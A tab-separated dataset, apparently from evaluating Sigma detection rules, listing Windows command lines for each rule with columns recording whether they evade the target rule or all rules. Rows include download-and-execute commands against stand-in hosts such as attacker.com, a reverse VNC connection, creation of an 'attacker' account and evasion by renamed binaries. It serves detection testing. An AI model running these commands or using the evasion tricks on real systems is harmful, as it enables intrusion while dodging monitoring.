Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
unknown	proc_creation_win_rundll32_setupapi_installhinfsection				rundll32.exe setupa~1.dll,InstallHinfSection DefaultInstall 128 C:\temp\payload.inf	TRUE	TRUE	FALSE	Use NTFS Short Name in Command Line (dd6b39d9-d9be-4a3b-8fe0-fe3c6a5c1795); Use NTFS Short Name in Command Line (dd6b39d9-d9be-4a3b-8fe0-fe3c6a5c1795)
unknown	proc_creation_win_rundll32_spawn_explorer				copy rundll32.exe run_update.exe && run_update.exe payload.dll,SpawnExplorer	FALSE	FALSE	FALSE	
unknown	proc_creation_win_rundll32_spawn_explorer				"rundll32.exe payload.dll,EntryPoint ""\shell32.dll,Control_RunDLL"""	TRUE	TRUE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
unknown	proc_creation_win_rundll32_susp_shellexec_ordinal_execution				copy shell32.dll C:\Windows\Tasks\legit.dat && rundll32.exe C:\Windows\Tasks\legit.dat,#565 cmd.exe /c calc.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_rundll32_susp_shellexec_ordinal_execution				"rundll32.exe ""shell32.dll"",ShellExec_RunDLL cmd.exe /c calc.exe"	TRUE	TRUE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
unknown	proc_creation_win_rundll32_susp_shellexec_ordinal_execution				"rundll32.exe SHELL32.DLL,#572 ""calc.exe"""	TRUE	TRUE	TRUE	
unknown	proc_creation_win_setres_uncommon_child_process				copy setres.exe renamed_utility.exe && cd C:\temp && renamed_utility.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_spoolsv_susp_child_processes				calc.exe	TRUE	TRUE	TRUE	
unknown	proc_creation_win_spoolsv_susp_child_processes				"cmd.exe /c ""echo .spl & start notepad.exe"""	TRUE	TRUE	TRUE	
unknown	proc_creation_win_spoolsv_susp_child_processes				"cmd.exe /c ""mkdir C:\Temp\payload && move exploit.dll C:\Temp\payload\"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_spoolsv_susp_child_processes				net.exe user attacker Password123 /add	TRUE	TRUE	FALSE	New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4); Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4); Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4)
unknown	proc_creation_win_spoolsv_susp_child_processes				"powershell.exe -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile shell.exe"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_susp_recon				"cmd.exe /c ""tree.com C:\ >> %TEMP%\tree_data.log"""	TRUE	TRUE	TRUE	
unknown	proc_creation_win_susp_recon				sc.exe query > C:\Users\Public\Documents\services.txt	TRUE	TRUE	FALSE	Potentially Suspicious CMD Shell Output Redirect (8e0bb260-d4b2-4fff-bb8d-3f82118e6892)
unknown	proc_creation_win_susp_recon				"wmic.exe OS get caption /format:list | Out-File -FilePath ""$env:TEMP\sys_info.txt"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_susp_use_of_te_bin				"copy ""te.exe"" update.exe && update.exe malicious.wsc"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_susp_workfolders				copy WorkFolders.exe WF.exe && cd C:\Temp && WF.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_sysinternals_tools_masquerading				ResourceHacker.exe -open malicious_payload.exe -save PsExec.exe -action addoverwrite -res sysinternals_versioninfo.res -mask VERSIONINFO,1,1033 && .\PsExec.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_sysinternals_tools_masquerading				strip.exe --strip-all malicious_payload.exe -o procdump.exe && .\procdump.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_uac_bypass_cmstp_com_object_access				"Rename-Item -Path ""dllhost.exe"" -NewName ""not_dllhost.exe""; & ""not_dllhost.exe"" /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_ultravnc				move vncviewer.exe svchost.exe && ./svchost.exe -connect attacker_ip::5500	FALSE	FALSE	FALSE	
unknown	proc_creation_win_winrm_susp_child_process				cscript.exe //E:jscript C:\Windows\Temp\payload.txt	TRUE	TRUE	FALSE	Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Cscript/Wscript Uncommon Script Extension Execution (99b7460d-c9f1-40d7-a316-1f36f61d52ee)
unknown	proc_creation_win_winrm_susp_child_process				rundll32.exe pcwutl.dll,LaunchApplication cmd.exe	TRUE	TRUE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
unknown	proc_creation_win_winrm_susp_child_process				"wmic.exe process call create ""payload.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_wsl_child_processes_anomalies				"copy cmd.exe not_cmd.exe && wsl.exe -e not_cmd.exe /c ""echo bypass"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_wsl_child_processes_anomalies				"wsl.exe -e /bin/bash -c ""cp /usr/bin/python3 /tmp/python3_rename && /tmp/python3_rename -c 'import os; os.system(\""powershell.exe -Command Write-Host Bypassed\"")'"""	TRUE	TRUE	TRUE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		"AddInUtil.exe ""-AddInRoot:C:\Program Files (x86)\Common Files\Microsoft Shared\VSTA\..\..\..\..\Users\Public\Payload"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe /AddInRoot:C:\Users\Public\Payload\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		copy AddInUtil.exe NotAddIn.exe && NotAddIn.exe -AddInRoot:C:\Users\Public\Payload\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		"copy powershell.exe AgentExecutor.exe && AgentExecutor.exe -Command ""Write-Output 'Bypassed'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		powershell.exe -ExecutionPolicy Bypass -File malicious.ps1	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe /LoadDLL malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		copy certoc.exe not_certoc.exe && not_certoc.exe -LoadDLL malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		certoc.exe -GetCACAPS httpayload.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		certoc.exe /GetCACAPS httpayload.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	cmd.exe /c curl http://example.com/payload.exe --output payload.exe & payload.exe	cmd.exe /c curl http://example.com/payload.exe --output payload.exe & payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl http://example.com/payload.exe > payload.exe & payload.exe	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & payload.exe	TRUE	TRUE	TRUE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		"powershell.exe -c ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl --url http://attacker.com/script.bat --out s.bat && s.bat"""	curl --url http://attacker.com/script.bat --out s.bat && s.bat	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl -s http://attacker.com/payload.ps1 --output p.ps1 ; powershell -ExecutionPolicy Bypass -File p.ps1	TRUE	TRUE	FALSE	Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl -sL http://attacker.com/payload.exe -O && payload.exe"""	curl -sL http://attacker.com/payload.exe -O && payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl http://attacker.com/payload.exe -o p.exe p.exe	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337	cmdl32   /vpn /lan C:\Users\thaim\AppData\Local\Temp\T1105\setting.txt	cmdl32  /vpn /lan C:\Users\thaim\AppData\Local\Temp\T1105\setting.txt	TRUE	FALSE	FALSE	Potential Arbitrary File Download Via Cmdl32.EXE (f37aba28-a9e6-4045-882c-d5004043b337)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe -vpn -lan C:\path\to\config.txt	TRUE	TRUE	TRUE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		copy cmdl32.exe not_an_exploit.exe && not_an_exploit.exe /vpn /lan C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -S C:\temp\payload.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -sC:\path\to\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe /s C:\path\to\malicious_script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe /S C:\Windows\Temp\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /S C:\Users\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		mkdir C:\Windows\System32\Drivers\ms_scripts && copy C:\Users\Public\malicious.txt C:\Windows\System32\Drivers\ms_scripts\script.txt && diskshadow.exe /s C:\Windows\System32\Drivers\ms_scripts\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dotnet_trace_lolbin_execution	Binary Proxy Execution Via Dotnet-Trace.EXE	9257c05b-4a4a-48e5-a670-b7b073cf401b		copy dotnet-trace.exe not_a_trace.exe && not_a_trace.exe collect -- calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dotnet_trace_lolbin_execution	Binary Proxy Execution Via Dotnet-Trace.EXE	9257c05b-4a4a-48e5-a670-b7b073cf401b		"dotnet-trace collect --"""" calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		copy dsacls.exe not_dsacls.exe && not_dsacls.exe /U:admin /P:Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		"dsacls.exe ""/user:domain\user"" ""/pass""""wd:password123"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		set P=/passwd: && dsacls.exe /user:admin %P%Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		copy DXCap.exe NotDXCap.exe && NotDXCap.exe -c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		"DXCap.exe	-c	calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -v -c notepad.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	"expand   \""C:\Users\thaim\AppData\Local\Temp\art-expand-test.cab\"" -F:* ."	"expand  ""C:\Users\thaim\AppData\Local\Temp\art-expand-test.cab"" -F:* ."	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		copy expand.exe not_expand.exe && not_expand.exe -f:* C:\path\to\malicious.cab C:\Windows\System32\Drivers\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe /f:* C:\malicious.cab C:\Users\Administrator\Documents\	TRUE	TRUE	TRUE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		expand.exe /F:* C:\malicious.cab C:\Windows\System32\	TRUE	TRUE	TRUE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \\192.168.1.100\share\payload.txt"""	"cmd.exe /c ""findstr -v -l . \\192.168.1.100\share\payload.txt"""	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa		"cmd.exe /c copy findstr.exe search.exe && search.exe -v -l ""string"" \\192.168.1.100\share\payload.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr.exe /v /l \""dummy\"" \""\\192.168.1.100\share\payload.txt\"""""	"findstr.exe /v /l ""dummy"" ""\\192.168.1.100\share\payload.txt"""	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr /V /L \""searchstring\"" \\127.0.0.1\share\payload.txt"""	"findstr /V /L ""searchstring"" \\127.0.0.1\share\payload.txt"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr /v /l \""arbitrary_string\"" \\127.0.0.1\share\payload.txt"""	"findstr /v /l ""arbitrary_string"" \\127.0.0.1\share\payload.txt"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"cmd.exe /c findstr /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"cmd.exe /c copy findstr.exe grep.exe && grep.exe -s -i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"copy findstr.exe fstr.exe && fstr.exe /s /i ""sensitive_data"" ."	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr ""sensitive_data"" . /s /i"	TRUE	TRUE	TRUE	
